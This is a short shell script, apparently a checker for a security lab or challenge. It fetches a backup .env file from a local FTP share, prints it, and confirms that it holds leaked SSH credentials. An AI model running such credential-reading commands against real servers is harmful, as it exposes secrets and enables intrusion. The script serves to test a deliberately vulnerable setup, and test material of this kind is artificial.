#!/bin/sh
# Prove the share leaks usable credentials.
set -eu
env=$(curl -sS "ftp://${BOX_U}:${BOX_P}@127.0.0.1/backup/.env")
echo "$env"
echo "$env" | grep -q "${BOX_SSH_USER}" || { echo "leaked user missing" >&2; exit 1; }
echo "$env" | grep -q "${BOX_SSH_PASS}" || { echo "leaked password missing" >&2; exit 1; }
